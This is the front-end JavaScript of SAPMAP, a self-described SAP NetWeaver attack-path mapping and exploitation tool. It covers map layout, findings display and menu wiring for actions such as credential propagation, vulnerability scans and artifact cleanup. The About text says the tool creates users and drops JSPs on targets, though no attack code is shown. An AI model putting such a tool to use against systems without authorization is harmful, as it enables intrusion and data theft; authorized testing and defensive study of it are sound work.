  const ySpacing = _LO_BOX_H + _LO_MARGIN * 1.5;
  const xSpacing = _LO_BOX_W + _LO_MARGIN;
  const maxRow = Math.max(...layerKeys.map(k => buckets[k].length));
  const rowWidth = maxRow * xSpacing;
  // BTP cloud tier sits above the on-prem hierarchy.
  const btpTier = _loPlaceBtpTier(_LO_MARGIN, _LO_MARGIN);
  layerKeys.forEach((lk, layerIdx) => {
    const row = buckets[lk].sort();
    const yC = _LO_MARGIN + btpTier + layerIdx * ySpacing + _LO_BOX_H / 2;
    const xPad = (rowWidth - row.length * xSpacing) / 2;
    row.forEach((sid, i) => {
      const xC = _LO_MARGIN + xPad + i * xSpacing + _LO_BOX_W / 2;
      _loCenter(nodes[sid], xC, yC);
    });
  });
  // SCC nodes have no RFC edges — stack them in a column to the right.
  const sccHosts = Object.keys(mapState.scc_nodes || {}).sort();
  if (sccHosts.length) {
    const sccX = _LO_MARGIN + rowWidth + _LO_MARGIN + _LO_BOX_W / 2;
    sccHosts.forEach((h, i) => {
      const yC = _LO_MARGIN + btpTier + i * (_LO_BOX_H + _LO_MARGIN) + _LO_BOX_H / 2;
      _loCenter((mapState.scc_nodes||{})[h], sccX, yC);
    });
  }
  fitMap();
  updateMap();
}

function layoutByStack() {
  // Group nodes into clusters by system_type.  Each cluster gets its
  // own column; nodes within a cluster stack vertically.  Saproute
  // and unknown-stack nodes get their own columns at the right edge.
  // SCC (Cloud Connector) nodes are placed in a dedicated column too
  // so they don't stay at their stale previous coords.
  const sids = _loSortedNodeKeys();
  const sccHosts = Object.keys(mapState.scc_nodes || {}).sort();
  if (sids.length === 0 && sccHosts.length === 0) return;
  flashActivity('Rearranging: Group by Stack');
  const nodes = mapState.nodes;

  function bucketOf(n) {
    const t = (n.system_type || '').toUpperCase();
    if (t === 'SAPROUTER') return 'SAProuter';
    if (t.includes('ABAP') && t.includes('JAVA')) return 'ABAP+JAVA';
    if (t.includes('ABAP')) return 'ABAP';
    if (t.includes('JAVA')) return 'JAVA';
    return 'Other';
  }
  const order = ['ABAP', 'ABAP+JAVA', 'JAVA', 'SAProuter', 'SCC', 'Other'];
  const clusters = {};
  order.forEach(b => { clusters[b] = []; });
  sids.forEach(sid => {
    const b = bucketOf(nodes[sid]);
    if (!clusters[b]) clusters[b] = [];
    clusters[b].push(sid);
  });
  // SCC nodes live in their own bucket (keyed by host, not sid)
  sccHosts.forEach(h => { clusters['SCC'].push(h); });
  // Drop empty clusters; keep order
  const populated = order.filter(b => clusters[b].length > 0);
  const xSpacing = _LO_BOX_W + _LO_MARGIN * 2;
  const ySpacing = _LO_BOX_H + _LO_MARGIN;
  // Reserve a cloud-tier strip at the top for BTP subaccount nodes
  // so the on-prem stack columns don't end up underneath them.
  const btpTier = _loPlaceBtpTier(_LO_MARGIN, _LO_MARGIN);
  populated.forEach((b, colIdx) => {
    clusters[b].sort().forEach((id, rowIdx) => {
      const xC = _LO_MARGIN + colIdx * xSpacing + _LO_BOX_W / 2;
      const yC = _LO_MARGIN + 30 + btpTier + rowIdx * ySpacing + _LO_BOX_H / 2;
      const obj = (b === 'SCC')
        ? (mapState.scc_nodes || {})[id]
        : nodes[id];
      if (obj) _loCenter(obj, xC, yC);
    });
  });
  fitMap();
  updateMap();
}
function applyViewBox() {
  const vb = `${viewBox.x} ${viewBox.y} ${viewBox.w} ${viewBox.h}`;
  document.getElementById('map-svg').setAttribute('viewBox', vb);
  const pulseSvg = document.getElementById('pulse-svg');
  if (pulseSvg) pulseSvg.setAttribute('viewBox', vb);
}
function showAbout() {
  const body = `
<div style="padding:18px 22px;max-width:720px;line-height:1.55;color:#c9d1d9">
  <h2 style="margin:0 0 8px 0;color:#e6edf3">&#9889; SAPMAP</h2>
  <div style="color:#8b949e;font-size:12px;margin-bottom:18px">
    SAP Landscape Attack-Path Mapper — offensive/defensive recon,
    credential propagation, and data-extraction toolkit for SAP
    NetWeaver ABAP &amp; Java stacks.
  </div>

  <h3 style="color:#f85149;margin:0 0 6px 0">&#9888;&#65039; Disclaimer</h3>
  <div style="background:#161b22;border:1px solid #30363d;
               border-radius:6px;padding:12px 14px;font-size:13px">
    <p style="margin:0 0 10px 0"><b>Use at your own risk.</b>
      SAPMAP implements real, working exploits against SAP systems.
      Running it against a system you do not own or do not have
      explicit written permission to test is <b>illegal</b> in most
      jurisdictions and can result in data loss, system outages,
      locked accounts, or audit findings.</p>

    <p style="margin:0 0 10px 0">This tool is intended <b>solely</b>
      for:</p>
    <ul style="margin:0 0 10px 18px;padding:0">
      <li>authorized penetration tests and red-team engagements,</li>
      <li>defensive security research on systems you own or
          administer,</li>
      <li>educational study of SAP attack surfaces, and</li>
      <li>SOC / blue-team detection-engineering exercises.</li>
    </ul>

    <p style="margin:0 0 10px 0">You are responsible for:</p>
    <ul style="margin:0 0 10px 18px;padding:0">
      <li>having written authorization before running any scan,
          check, or exploit against a system,</li>
      <li>the consequences of any action you take with this tool,</li>
      <li>cleaning up artifacts (SAPMAP00 users, dropped JSPs, TCP/IP
          destinations) when you are done — see Actions &rarr;
          Cleanup All Users.</li>
    </ul>

    <p style="margin:0"><b>No warranty.</b> SAPMAP is provided
      "as is", without warranty of any kind, express or implied.
      The authors accept no liability for any damage caused by
      its use or misuse.</p>
  </div>

  <div style="margin-top:16px;font-size:12px;color:#8b949e">
    Source: <a href="https://github.com/kloris/SAPMAP"
                target="_blank"
                style="color:#58a6ff">github.com/kloris/SAPMAP</a>
    &nbsp;·&nbsp; Report issues, PRs welcome.
  </div>

  <div style="text-align:right;margin-top:18px">
    <button class="btn btn-primary"
            onclick="document.getElementById('about-modal').remove()">
      I understand
    </button>
  </div>
</div>`;
  // Remove any existing modal first (in case user clicks twice)
  const existing = document.getElementById('about-modal');
  if (existing) existing.remove();
  const m = document.createElement('div');
  m.id = 'about-modal';
  m.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.65);'
    + 'z-index:10000;display:flex;align-items:center;justify-content:center;';
  m.innerHTML = '<div style="background:#0d1117;border:1px solid #30363d;'
    + 'border-radius:10px;box-shadow:0 8px 40px rgba(0,0,0,.6);max-width:760px">'
    + body + '</div>';
  m.addEventListener('click', (e) => { if (e.target === m) m.remove(); });
  document.body.appendChild(m);
}

function toggleConsole() {
  const c = document.getElementById('console-container');
  const r = document.getElementById('console-restore');
  const rz = document.getElementById('console-resizer');
  const hidden = c.style.display === 'none';
  c.style.display = hidden ? 'flex' : 'none';
  r.style.display = hidden ? 'none' : 'block';
  if (rz) rz.style.display = hidden ? 'block' : 'none';
  // If we were maximized, restore map/legend when minimizing
  if (!hidden && consoleMaximized) {
    c.style.height = '180px';
    c.style.flex = '';
    document.getElementById('console-body').style.overflow = '';
    document.getElementById('map-container').style.display = '';
    document.getElementById('legend-bar').style.display = '';
    consoleMaximized = false;
  }
}
function toggleToolbar() {
  const t = document.getElementById('toolbar');
  t.style.display = t.style.display === 'none' ? 'flex' : 'none';
}

// --- Drag & Pan ---
function _getDragTarget(sid) {
  if (sid.startsWith('unk:')) return unkPositions[sid.slice(4)];
  if (sid.startsWith('scc:')) return (mapState.scc_nodes || {})[sid.slice(4)];
  if (sid.startsWith('btp:')) return (mapState.btp_subaccounts || {})[sid.slice(4)];
  return mapState.nodes[sid];
}
function startDrag(e, sid) {
  if (e.button === 2) return; // right-click = context menu
  e.stopPropagation();
  dragNode = sid;
  dragMoved = false;
  dragStartPos.x = e.clientX;
  dragStartPos.y = e.clientY;
  const n = _getDragTarget(sid);
  if (!n) return;
  const svg = document.getElementById('map-svg');
  const pt = svg.createSVGPoint();
  pt.x = e.clientX; pt.y = e.clientY;
  const svgPt = pt.matrixTransform(svg.getScreenCTM().inverse());
  dragOffset.x = svgPt.x - (n._x || 0);
  dragOffset.y = svgPt.y - (n._y || 0);
}

function updateStatusBar() {
  const s = mapState.stats || {};
  document.getElementById('st-systems').textContent = s.systems || Object.keys(mapState.nodes||{}).length;
  document.getElementById('st-connections').textContent = s.connections || (mapState.connections||[]).length;
  document.getElementById('st-pwned').textContent = s.pwned || 0;
  document.getElementById('st-users').textContent = s.users_created || 0;
}

// Keep the last-shown activity visible for a short grace period after
// the task completes, so fast steps don't flash by too quickly to read.
// A brand-new activity overrides the grace window immediately.
const _ACTIVITY_HOLD_MS = 3000;
const _FLASH_HOLD_MS    = 3000;
let _activityHideTimer = null;

// Client-side "flash" activities — synchronous or purely-UI actions
// that aren't tracked by the server's active_tasks map (e.g. layout
// changes, set_credentials, add_system).  Each entry auto-expires.
// Shape: {id → {label, expiresAt}}
const _flashActivities = {};
let _flashCounter = 0;

function flashActivity(label, holdMs) {
  const id = 'f' + (++_flashCounter);
  _flashActivities[id] = {
    label: label || 'Working',
    expiresAt: Date.now() + (holdMs || _FLASH_HOLD_MS),
  };
  updateActivityBar();
  // Schedule re-render right when this flash expires
  setTimeout(updateActivityBar, (holdMs || _FLASH_HOLD_MS) + 50);
}

function _collectFlashLabels() {
  const now = Date.now();
  const out = [];
  for (const id in _flashActivities) {
    if (_flashActivities[id].expiresAt <= now) {
      delete _flashActivities[id];
    } else {
      out.push(_flashActivities[id].label);
    }
  }
  return out;
}

function updateActivityBar() {
  const bar = document.getElementById('activity-bar');
  const keys = Object.keys(activeTasks);
  const flashes = _collectFlashLabels();

  if (keys.length > 0 || flashes.length > 0) {
    const parts = [];
    for (const key of keys) {
      const label = activeTasks[key];
      const colonIdx = key.indexOf(':');
      const sid = colonIdx > 0 && !key.startsWith('_') ? key.substring(0, colonIdx) : '';
      parts.push(sid ? `${sid}: ${label}` : label);
    }
    parts.push(...flashes);
    const text = parts.join(' | ');
    if (_activityHideTimer) { clearTimeout(_activityHideTimer); _activityHideTimer = null; }
    document.getElementById('activity-text').textContent = text;
    bar.classList.add('active');
    return;
  }

  if (!bar.classList.contains('active')) return;
  if (_activityHideTimer) return;
  _activityHideTimer = setTimeout(() => {
    _activityHideTimer = null;
    if (Object.keys(activeTasks).length === 0 &&
        _collectFlashLabels().length === 0) {
      bar.classList.remove('active');
    }
  }, _ACTIVITY_HOLD_MS);
}

function _nodeHasActiveTask(sid) {
  for (const key in activeTasks) {
    if (key === sid + ':' || key.startsWith(sid + ':')) return true;
  }
  return false;
}

// Count undismissed findings scoped to a given node SID, and record the
// worst severity so the map badge can pick a colour without scanning
// twice.  Banner auto-dismiss (after 5 s) DOES decay these — the badge
// is "unresolved attention", not "lifetime count".
const _SEV_RANK = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, INFO: 1 };
function _nodeFindingCount(sid) {
  let count = 0, worstRank = 0, worst = '';
  for (const f of _activeFindings) {
    if (f.node !== sid) continue;
    if (_dismissedFindingIds.has(f.id)) continue;
    count++;
    const r = _SEV_RANK[f.severity] || 0;
    if (r > worstRank) { worstRank = r; worst = f.severity; }
  }
  return { count, worst };
}

// ---------------------------------------------------------------
// Findings banner + drawer + bell
// ---------------------------------------------------------------
// Only CRITICAL/HIGH surface as live banner rows above the map.
// MEDIUM/INFO still go to the drawer + console but don't grab the
// full-width attention grabber.
const _BANNER_SEVERITIES = { CRITICAL: true, HIGH: true, INFO: true };
const _SEV_LABEL = {
  CRITICAL: 'CRITICAL', HIGH: 'HIGH', MEDIUM: 'MEDIUM', INFO: 'INFO',
};

function _escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function renderFindings() {
  const bar = document.getElementById('findings-bar');
  const bell = document.getElementById('findings-bell');
  const badge = document.getElementById('findings-badge');
  const drawerBody = document.getElementById('findings-drawer-body');
  if (!bar || !bell || !badge || !drawerBody) return;

  // --- Banner: only undismissed CRITICAL/HIGH, newest first, cap at 5 ---
  const bannerRows = [];
  for (let i = _activeFindings.length - 1; i >= 0 && bannerRows.length < 5; i--) {
    const f = _activeFindings[i];
    if (_dismissedFindingIds.has(f.id)) continue;
    if (_bannerHiddenIds.has(f.id)) continue;
    if (!_BANNER_SEVERITIES[f.severity]) continue;
    bannerRows.push(f);
  }
  // Reverse so the newest toast sits at the bottom of the stack (nearest
  // the bottom-right corner), matching standard toast-notification UX.
  bar.innerHTML = bannerRows.slice().reverse().map(f => {
    const sev = _SEV_LABEL[f.severity] || 'INFO';
    const node = _escapeHtml(f.node || '?');
    const nodeClick = f.node
      ? ` onclick="focusFindingNode('${_escapeHtml(f.node)}')"`
      : '';
    const cve = f.cve
      ? ` <span class="finding-cve">${_escapeHtml(f.cve)}</span>` : '';
    return `<div class="finding-row sev-${sev}">`
      + `<span class="finding-sev">${sev}</span>`
      + `<span class="finding-node"${nodeClick}>${node}</span>`
      + `<span class="finding-msg">${_escapeHtml(f.msg)}</span>${cve}`
      + `<span class="finding-dismiss" title="Dismiss"`
      + ` onclick="dismissFinding(${f.id})">&times;</span>`
      + `</div>`;
  }).join('');

  // --- Bell badge + glow state ---
  let undismissedCrit = 0, undismissedHigh = 0, totalUndismissed = 0;
  for (const f of _activeFindings) {
    if (_dismissedFindingIds.has(f.id)) continue;
    totalUndismissed++;
    if (f.severity === 'CRITICAL') undismissedCrit++;
    else if (f.severity === 'HIGH') undismissedHigh++;
  }
  badge.textContent = String(totalUndismissed);
  badge.classList.toggle('show', totalUndismissed > 0);
  bell.classList.toggle('has-critical', undismissedCrit > 0);
  bell.classList.toggle('has-high', undismissedCrit === 0 && undismissedHigh > 0);

  // --- Drawer body: full history, newest first, honouring filters ---
  const fltEnabled = {
    CRITICAL: document.getElementById('fflt-crit')?.checked !== false,
    HIGH:     document.getElementById('fflt-high')?.checked !== false,
    MEDIUM:   document.getElementById('fflt-med')?.checked  !== false,
    INFO:     document.getElementById('fflt-info')?.checked !== false,
  };
  const nodeFilter = (document.getElementById('fflt-node')?.value || '')
    .trim().toLowerCase();
  const visible = _activeFindings.filter(f => {
    if (!fltEnabled[f.severity]) return false;
    if (nodeFilter && !(f.node || '').toLowerCase().includes(nodeFilter))
      return false;
    return true;
  });
  if (visible.length === 0) {
    drawerBody.innerHTML = '<div style="color:#6e7681;padding:20px;'
      + 'text-align:center">No findings match the current filter</div>';
  } else {
    const rows = [];
    for (let i = visible.length - 1; i >= 0; i--) {
      const f = visible[i];
      const sev = _SEV_LABEL[f.severity] || 'INFO';
      const ts = new Date((f.ts || 0) * 1000);
      const hh = String(ts.getHours()).padStart(2, '0');
      const mm = String(ts.getMinutes()).padStart(2, '0');
      const ss = String(ts.getSeconds()).padStart(2, '0');
      const dismissed = _dismissedFindingIds.has(f.id);
      const nodeClick = f.node
        ? ` onclick="focusFindingNode('${_escapeHtml(f.node)}')"`
        : '';
      rows.push(
        `<div class="finding-log-row sev-${sev}"`
          + (dismissed ? ' style="opacity:0.55"' : '')
          + `>`
        + `<span style="color:#6e7681;font-size:10px;margin-right:6px">`
          + `${hh}:${mm}:${ss}</span>`
        + `<span class="finding-sev">${sev}</span>`
        + `<span class="finding-node"${nodeClick}>`
          + `${_escapeHtml(f.node || '?')}</span>`
        + `<span class="finding-msg">${_escapeHtml(f.msg)}</span>`
        + (f.cve
            ? `<span class="finding-cve">${_escapeHtml(f.cve)}</span>` : '')
        + `</div>`
      );
    }
    drawerBody.innerHTML = rows.join('');
  }
}

function dismissFinding(id) {
  _dismissedFindingIds.add(id);
  renderFindings();
  try { updateMap(); } catch (_) {}
}

function copyFindingsMarkdown() {
  if (_activeFindings.length === 0) {
    try { showToast('No findings to copy'); } catch (_) {}
    return;
  }
  const lines = ['# SAPMAP session findings', ''];
  lines.push(`_${_activeFindings.length} event(s), newest first_`, '');
  for (let i = _activeFindings.length - 1; i >= 0; i--) {
    const f = _activeFindings[i];
    const ts = new Date((f.ts || 0) * 1000).toISOString();
    const cve = f.cve ? ` [${f.cve}]` : '';
    lines.push(`- **${f.severity}** ${ts} · \`${f.node || '?'}\` — `
               + `${f.msg}${cve}`);
  }
  const md = lines.join('\n');
  try {
    navigator.clipboard.writeText(md);
    showToast(`Copied ${_activeFindings.length} finding(s) as markdown`);
  } catch (e) {
    try { showToast('Clipboard blocked: ' + e); } catch (_) {}
  }
}

function toggleFindingsDrawer() {
  _findingsDrawerOpen = !_findingsDrawerOpen;
  const d = document.getElementById('findings-drawer');
  if (d) d.classList.toggle('open', _findingsDrawerOpen);
}

// ---------------------------------------------------------------------------
// Pulse overlay — when a finding fires, briefly light up the relevant node
// box (and, for SAP_ALL / credentialed connections, the edge between two
// nodes).  Uses short-lived SVG elements with native <animate> children so
// they self-destroy when the animation ends and survive map innerHTML
// rebuilds (the pulse layer is a sibling <svg>).
// ---------------------------------------------------------------------------
const _PULSE_COLORS = {
  CRITICAL: '#ff4d4d',
  HIGH:     '#f0883e',
  MEDIUM:   '#d29922',
  INFO:     '#388bfd',
};

function _getNodeCenter(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n || n._x == null) return null;
  const BOX_W = 240, BOX_H = 174;
  return { x: n._x, y: n._y, w: BOX_W, h: BOX_H,
           cx: n._x + BOX_W / 2, cy: n._y + BOX_H / 2 };
}

function _pulseNode(sid, severity) {
  const pulse = document.getElementById('pulse-svg');
  if (!pulse) return;
  const pos = _getNodeCenter(sid);
  if (!pos) return;
  const color = _PULSE_COLORS[severity] || _PULSE_COLORS.INFO;
  const svgNS = 'http://www.w3.org/2000/svg';
  // Border rect: starts flush with the node, expands outward while fading.
  const pad = 4;
  const rect = document.createElementNS(svgNS, 'rect');
  rect.setAttribute('x', pos.x - pad);
  rect.setAttribute('y', pos.y - pad);
  rect.setAttribute('width', pos.w + pad * 2);
  rect.setAttribute('height', pos.h + pad * 2);
  rect.setAttribute('rx', 8);
  rect.setAttribute('fill', 'none');
  rect.setAttribute('stroke', color);
  rect.setAttribute('stroke-width', 4);
  rect.setAttribute('opacity', 0.9);
  // Expanding stroke + fading opacity, 3 cycles over ~2.4s.
  rect.innerHTML =
    `<animate attributeName="stroke-width" values="3;10;3" ` +
        `dur="0.8s" repeatCount="3" />` +
    `<animate attributeName="opacity" values="0.9;0.2;0.9" ` +
        `dur="0.8s" repeatCount="3" />`;
  pulse.appendChild(rect);
  setTimeout(() => rect.remove(), 2500);
}

function _pulseConnection(srcSid, tgtSid, severity) {
  const pulse = document.getElementById('pulse-svg');
  if (!pulse) return;
  const a = _getNodeCenter(srcSid);
  const b = _getNodeCenter(tgtSid);
  if (!a || !b) return;
  const color = _PULSE_COLORS[severity] || _PULSE_COLORS.CRITICAL;
  const svgNS = 'http://www.w3.org/2000/svg';
  // Straight line between box centers — the real edge may be curved, but
  // a thick pulsing overlay at center-to-center reads clearly as "this
  // connection just lit up" without duplicating clip/curve math.
  const line = document.createElementNS(svgNS, 'line');
  line.setAttribute('x1', a.cx);
  line.setAttribute('y1', a.cy);
  line.setAttribute('x2', b.cx);
  line.setAttribute('y2', b.cy);
  line.setAttribute('stroke', color);
  line.setAttribute('stroke-width', 4);
  line.setAttribute('stroke-linecap', 'round');
  line.setAttribute('opacity', 0.85);
  line.innerHTML =
    `<animate attributeName="stroke-width" values="3;12;3" ` +
        `dur="0.7s" repeatCount="3" />` +
    `<animate attributeName="opacity" values="0.85;0.15;0.85" ` +
        `dur="0.7s" repeatCount="3" />`;
  pulse.appendChild(line);
  // Also light up both endpoints so the eye is drawn to them too.
  _pulseNode(srcSid, severity);
  _pulseNode(tgtSid, severity);
  setTimeout(() => line.remove(), 2200);
}

function _maybePulseFromFinding(rec) {
  if (!rec || !rec.node) return;
  const sev = rec.severity || 'INFO';
  const meta = rec.meta || {};
  if (meta.source_sid && meta.target_sid) {
    _pulseConnection(meta.source_sid, meta.target_sid, sev);
  } else {
    _pulseNode(rec.node, sev);
  }
}

// Request Notification permission lazily on first scan start so the
// browser only prompts when the feature is actually about to be used.
let _notifPermissionAsked = false;
function _maybeAskNotifPermission() {
  if (_notifPermissionAsked) return;
  _notifPermissionAsked = true;
  if (typeof Notification === 'undefined') return;
  if (Notification.permission === 'default') {
    try { Notification.requestPermission(); } catch (_) {}
  }
}
function _maybeNotifyDesktop(rec) {
  if (typeof Notification === 'undefined') return;
  if (Notification.permission !== 'granted') return;
  // Only pop when the window isn't the active tab — otherwise the
  // banner + drawer + console are already visible.
  if (!document.hidden && document.hasFocus && document.hasFocus()) return;
  try {
    const n = new Notification('SAPMAP: CRITICAL — ' + (rec.node || '?'), {
      body: rec.msg || '',
      tag: 'sapmap-' + rec.id,
      silent: false,
    });
    n.onclick = () => { try { window.focus(); } catch (_) {} n.close(); };
  } catch (_) { /* some browsers throw on rapid creation */ }
}

function focusFindingNode(sid) {
  if (!sid || sid === '?') return;
  // If the SID is mapped, open its details panel.  If it's just a
  // host/IP (no node yet), fall back to flashing the activity bar.
  if (mapState.nodes && mapState.nodes[sid]) {
    try { showDetails(sid); } catch (_) {}
    return;
  }
  try { flashActivity('Focus: ' + sid); } catch (_) {}
}

// --- Global event listeners ---
document.addEventListener('mousemove', e => {
  if (dragNode) {
    const dx = e.clientX - dragStartPos.x, dy = e.clientY - dragStartPos.y;
    if (dx*dx + dy*dy > 9) dragMoved = true;  // 3px threshold
    const svg = document.getElementById('map-svg');
    const pt = svg.createSVGPoint();
    pt.x = e.clientX; pt.y = e.clientY;
    const svgPt = pt.matrixTransform(svg.getScreenCTM().inverse());
    const dt = _getDragTarget(dragNode);
    if (dt) { dt._x = svgPt.x - dragOffset.x; dt._y = svgPt.y - dragOffset.y; }
    updateMap();
  } else if (isPanning) {
    viewBoxUserControlled = true;
    const svg = document.getElementById('map-svg');
    const scale = viewBox.w / svg.clientWidth;
    viewBox.x -= (e.clientX - panStart.x) * scale;
    viewBox.y -= (e.clientY - panStart.y) * scale;
    panStart.x = e.clientX; panStart.y = e.clientY;
    applyViewBox();
  }
});

document.addEventListener('mouseup', () => {
  if (dragNode && !dragMoved && !dragNode.startsWith('unk:')) showDetails(dragNode);
  dragNode = null; isPanning = false;
});

document.getElementById('map-container').addEventListener('mousedown', e => {
  if (e.target === document.getElementById('map-svg') || e.target === document.getElementById('map-container')) {
    isPanning = true; panStart.x = e.clientX; panStart.y = e.clientY;
  }
});

document.getElementById('map-container').addEventListener('wheel', e => {
  e.preventDefault();
  viewBoxUserControlled = true;
  const factor = e.deltaY > 0 ? 1.1 : 0.9;
  viewBox.w *= factor; viewBox.h *= factor;
  applyViewBox();
}, { passive: false });

document.addEventListener('click', e => {
  hideCtxMenu();
  hideSCCCtxMenu();
  hideBTPCtxMenu();
  if (!e.target.closest('.info-panel') && !e.target.closest('.edge-line'))
    document.getElementById('info-panel').classList.remove('visible');
});

document.addEventListener('contextmenu', e => {
  const nodeBox = e.target.closest('.node-box');
  const mapSvg = document.getElementById('map-svg');
  const mapContainer = document.getElementById('map-container');
  hideCtxMenu();
  hideSCCCtxMenu();
  hideBTPCtxMenu();
  hideMapCtxMenu();
  if (!nodeBox && (e.target === mapSvg || e.target === mapContainer ||
      mapSvg.contains(e.target) || mapContainer.contains(e.target))) {
    e.preventDefault();
    showMapCtxMenu(e);
  }
});

function showMapCtxMenu(e) {
  const menu = document.getElementById('map-ctx-menu');
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  document.getElementById('map-ctx-check-all-gw').style.display =
    nodeCount >= 2 ? '' : 'none';
  menu.classList.add('visible');
  let mx = e.clientX, my = e.clientY;
  const rect = menu.getBoundingClientRect();
  if (mx + rect.width > window.innerWidth) mx = window.innerWidth - rect.width - 4;
  if (my + rect.height > window.innerHeight) my = window.innerHeight - rect.height - 4;
  menu.style.left = mx + 'px';
  menu.style.top = my + 'px';
}
function hideMapCtxMenu() {
  document.getElementById('map-ctx-menu').classList.remove('visible');
}
document.getElementById('map-ctx-menu').addEventListener('click', function(e) {
  const item = e.target.closest('.ctx-item[data-action]');
  if (!item) return;
  hideMapCtxMenu();
  switch (item.getAttribute('data-action')) {
    case 'map_add_system': showAddSystemModal(); break;
    case 'map_propagate_all': propagateAll(); break;
    case 'map_cleanup_all': cleanupAll(); break;
    case 'map_scan_all_vulns': scanAllVulns(); break;
    case 'map_check_all_gw': checkAllGateways(); break;
    case 'map_check_all_betrusted': checkAllBetrusted(); break;
    case 'map_analyze_chains': analyzeChains(); break;
    case 'map_fit': fitMap(); break;
    case 'map_reset_layout': resetLayout(); break;
  }
});
document.addEventListener('click', () => hideMapCtxMenu());

// --- Console resize (drag handle) ---
(function initConsoleResizer() {
  const resizer = document.getElementById('console-resizer');
  const container = document.getElementById('console-container');
  if (!resizer || !container) {
    console.warn('[resizer] elements missing', {resizer, container});
    return;
  }
  const LS_KEY = 'sapmap.consoleHeight';
  const MIN_H = 60;
  const maxH = () => Math.max(MIN_H + 20, Math.floor(window.innerHeight * 0.8));
  const setH = (h) => {
    // !important defeats any late-arriving class-based CSS that might
    // try to re-pin the height (e.g. a rerender helper that re-adds
    // the .console-container class with its 180px default).
    container.style.setProperty('height', h + 'px', 'important');
  };
  // Restore saved height
  const saved = parseInt(localStorage.getItem(LS_KEY) || '', 10);
  if (!isNaN(saved) && saved >= MIN_H) {
    setH(Math.min(saved, maxH()));
  }
  let dragging = false, startY = 0, startH = 0, pointerId = null;
  resizer.addEventListener('pointerdown', (e) => {
    if (consoleMaximized) return;
    if (container.style.display === 'none') return;
    dragging = true;
    pointerId = e.pointerId;
    startY = e.clientY;
    startH = container.getBoundingClientRect().height;
    resizer.classList.add('dragging');
    try { resizer.setPointerCapture(e.pointerId); } catch (err) {}
    document.body.style.userSelect = 'none';
    document.body.style.cursor = 'ns-resize';
    e.preventDefault();
  });
  resizer.addEventListener('pointermove', (e) => {
    if (!dragging) return;
    const delta = startY - e.clientY; // drag up => increase
    let h = startH + delta;
    h = Math.max(MIN_H, Math.min(h, maxH()));
    setH(h);
  });
  const stopDrag = (e) => {
    if (!dragging) return;
    dragging = false;
    resizer.classList.remove('dragging');
    try { if (pointerId != null) resizer.releasePointerCapture(pointerId); } catch (err) {}
    pointerId = null;
    document.body.style.userSelect = '';
    document.body.style.cursor = '';
    const h = Math.round(container.getBoundingClientRect().height);
    try { localStorage.setItem(LS_KEY, String(h)); } catch (err) {}
  };
  resizer.addEventListener('pointerup', stopDrag);
  resizer.addEventListener('pointercancel', stopDrag);
  resizer.addEventListener('lostpointercapture', stopDrag);
  // Double-click resets to default
  resizer.addEventListener('dblclick', () => {
    setH(180);
    try { localStorage.removeItem(LS_KEY); } catch (err) {}
  });
})();

// --- Keep the findings toast stack pinned just above the legend bar ---
// Anchor directly off the legend's top edge when visible (falls back to
// summing console+resizer heights when the legend is hidden).  Using the
// legend's bounding rect avoids arithmetic drift from gaps, margins, and
// flex padding between the stacked bottom elements.
(function initFindingsAnchor() {
  const bar = document.getElementById('findings-bar');
  const container = document.getElementById('console-container');
  const restore = document.getElementById('console-restore');
  const resizer = document.getElementById('console-resizer');
  const legend = document.getElementById('legend-bar');
  if (!bar || !container) return;
  const GAP = 8;
  const isVisible = (el) => {
    if (!el) return false;
    const s = window.getComputedStyle(el);
    return s.display !== 'none' && s.visibility !== 'hidden';
  };
  const hOf = (el) => isVisible(el) ? el.getBoundingClientRect().height : 0;
  const update = () => {
    let bottom;
    if (isVisible(legend)) {
      // Sit the toast bottom one gap above the legend's top edge.
      bottom = window.innerHeight - legend.getBoundingClientRect().top + GAP;
    } else {
      let base = 0;
      base += hOf(isVisible(container) ? container : restore);
      base += hOf(resizer);
      bottom = base + GAP;
    }
    bar.style.bottom = Math.max(0, bottom) + 'px';
  };
  update();
  const observed = [container, restore, resizer, legend].filter(Boolean);
  if ('ResizeObserver' in window) {
    const ro = new ResizeObserver(update);
    observed.forEach(el => ro.observe(el));
  }
  window.addEventListener('resize', update);
  window.addEventListener('scroll', update, true);
  const mo = new MutationObserver(update);
  observed.forEach(el => mo.observe(el,
    { attributes: true, attributeFilter: ['style', 'class'] }));
})();

// --- Init ---
startPolling();
</script>
</body>
</html>"""
